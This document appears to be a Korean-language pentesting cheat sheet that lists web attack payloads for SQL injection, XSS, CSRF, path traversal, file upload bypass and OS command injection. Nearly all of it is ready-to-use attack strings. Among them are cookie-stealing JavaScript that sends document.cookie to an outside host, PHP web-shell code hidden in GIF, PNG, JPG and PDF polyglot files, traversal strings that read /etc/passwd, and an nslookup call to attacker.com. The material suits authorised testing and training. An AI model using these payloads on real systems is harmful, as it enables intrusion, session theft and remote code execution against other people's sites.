---
title: Cheat Sheet
date: 2026-02-01 01:00:00 +09:00
categories: [Cheat Sheet]
---

## SQLi
#### 로그인 우회

```sql
' OR 1=1 --
' OR '1'='1' --
ADMIN' --
```

#### UNION SQLi

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --

' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --

' UNION SELECT database(), NULL, NULL --
```

#### DB 정보 수집
- MySQL

```sql
version()
database()
user()
```

- MSSQL

```sql
@@version
DB_NAME()
SYSTEM_USER
```

- PostgreSQL

```sql
version()
current_database()
current_user
```

- ORACLE

```sql
SELECT banner FROM v$version
user
sys_context('USERENV', 'CURRENT_SCHEMA')
```

TABLE 조회

```sql
' UNION SELECT table_name,NULL 
FROM information_schema.tables 
WHERE table_schema = database() --
// MySQL
WHERE table_catalog = DB_NAME() --
// MSSQL
WHERE table_schema = 'public' --
// PostgreSQL

' UNION SELECT table_name,NULL
FROM all_tables    
// ORACLE
```

COLUMN 조회

```sql
' UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='user' --
// MySQL, MSSQL, PostgreSQL

' UNION SELECT column_name,NULL
FROM all_tab_columns
WHERE table_name='USER' --    
// ORACLE
```

#### Boolean-Based Blind SQLi

```sql
' AND 1=1 --
' AND 1=2 --
```
```sql
' AND SUBSTRING(database(),1,1)='a' --
' AND ASCII(SUBSTRING(database(),1,1)) > 100 --
```

#### Time-Based Blind SQLi
- MySQL

```sql
' AND SLEEP(5) --
' AND IF(1=1, SLEEP(5), 0) --
```

- MSSQL

```sql
'; WAITFOR DELAY '0:0:5' --
'; IF (1=1) WAITFOR DELAY '0:0:5' --
```

- PostgreSQL

```sql
'; SELECT pg_sleep(5) --
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

' AND (SELECT pg_sleep(5)) IS NULL --
' AND EXISTS(SELECT 1 FROM pg_sleep(5)) --
```

- ORACLE

```sql
' AND EXISTS(SELECT 1 FROM DUAL WHERE 1=1 AND dbms_lock.sleep(5)=0) --
```

#### Error-Based SQLi

```sql
' AND extractvalue(1,concat(0x7e,database())) --
' AND updatexml(1,concat(0x7e,version()),1) --

' AND 1=CAST((SELECT database()) AS INT) --
```

## XSS
#### HTML Context
- 기본 테스트

```html
<script>alert(1)</script>
<svg><script>alert(1)</script>
<script>print(1)</script>
<script>confirm(1)</script>
<script>prompt(1)</script>
```

- 자동 트리거 테스트

```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<svg><animateTransform onbegin=alert(1)>
```

- data URI

```html
<iframe src="data:text/html,<script>alert(1)</script>">
```

#### Attribute Context
- 속성 탈출

```html
" onmouseover="alert(1)
" autofocus onfocus=alert(1) x="
```

- 이벤트 핸들러 삽입

```html
"><img src=x onerror=alert(1)>

"><body onresize=print() onload=this.style.width='100px'>
```

- Keyboard Trigger

```html
<input accesskey=x onclick=alert(1)>

/?'accesskey='x' onclick='alert(1)
```

#### URL Context
- JS Scheme

```html
javascript:alert(document.domain)
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)">
```

- data Scheme

```html
data:text/html,<script>alert(1)</script>
```

#### JS Context
- 문자열 탈출

```html
';alert(1);//
";alert(1);//
```

- script 태그 탈출

```html
</script><script>alert(1)</script>
```

- Cookie 탈취

```javascript
fetch("https://example.com?cookie="+document.cookie)
new Image().src="https://example.com?cookie="+document.cookie
<img src=x onerror="new Image().src='//example.com/'+document.cookie">
```

#### DOM-Based
- DOM Source

```
location.search
location.hash
document.URL
```

- DOM Sink

```
innerHTML
eval
document.write
```

- URL Fragment + onfocus + tabindex

```html
/?search=<x id=x tabindex=1 onfocus=alert(document.cookie)>#x
```

- hash 기반 기본 테스트

```html
#"><img src=x onerror=alert(1)>
#';alert(1);//
```


## CSRF

```javascript
<form method="POST" action="https://target.com/action">
    <input type="hidden" name="param1" value="value1">
    <input type="hidden" name="param2" value="value2">
</form>
<script>
    document.forms[0].submit();
</script>

<form id="csrf" method="POST" action="https://target.com/action">
    <input type="hidden" name="param1" value="value1">
    <input type="hidden" name="param2" value="value2">
</form>
<script>
    history.pushState('', '', '/');
    document.getElementById("csrf").submit();
</script>
```

#### GET CSRF

```javascript
<img src="https://bank.com/delete_account">
```

#### SameSite=Lax Bypass  
Top-level navigation  
GET Request

```javascript
<a href="https://bank.com/delete_account">

<script>
location = "https://bank.com/change_email?email=hacked@mail.com"
</script>
```

#### Referrer Policy

```html
Referrer-Policy: no-referrer

<meta name="referrer" content="no-referrer">
```

## Path Traversal

```
../etc/passwd
../../etc/passwd
../../../etc/passwd
```

#### URL Encoding 우회

```
..%2f
..%2f..%2f..%2fetc/passwd
%2e%2e%2f
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

#### Double Encoding

```
%252e%252e%252f
..%252f..%252f..%252fetc/passwd
```

#### Filter Bypass

```
....//
..././
```

#### Slash Variations

```
..\..\..\etc\passwd
..\/..\/..\/etc/passwd
..//..//..//etc/passwd
```

#### Null Byte

```
../../etc/passwd%00.jpg
```

#### 절대 경로 접근

```
/etc/passwd
```

## File Upload

#### Extension Bypass

```
.php
.phtml
.php5
.phar
.pht
```

#### Double Extension

```
shell.php.jpg
shell.php.png
shell.jpg.php
```

#### Path Traversal Upload

```
../shell.php
..%2fshell.php
```

#### MIME Type Bypass

```
Content-Type: image/jpeg
```

#### Null Byte

```
shell.php%00.jpg
```

#### .htaccess

```
디렉터리의 .txt 파일을 PHP로 실행
AddType application/x-httpd-php .txt
AddHandler application/x-httpd-php .jpg

디렉터리의 모든 파일을 PHP로 처리
SetHandler application/x-httpd-php
```

#### Polyglot

```
GIF
GIF89a
<?php system($_GET['cmd']); ?>

PNG
printf "\x89PNG\r\n\x1A\n<?php system($_GET['cmd']); ?>" > shell.png

JPG
printf "\xFF\xD8\xFF<?php system($_GET['cmd']); ?>" > shell.jpg

PDF
%PDF
<?php system($_GET['cmd']); ?>
```

## OS Command Injection

```
; id
; whoami

&& id
|| id

| id
```

#### Backtick / Subshell

```
`id`
$(id)
```

#### Blind Command Injection

```
; sleep 5
|| sleep 5 ||
; ping -c 5 127.0.0.1
응답 지연 여부 확인

; nslookup attacker.com
외부 서버로 DNS 요청 발생 여부 확인
```

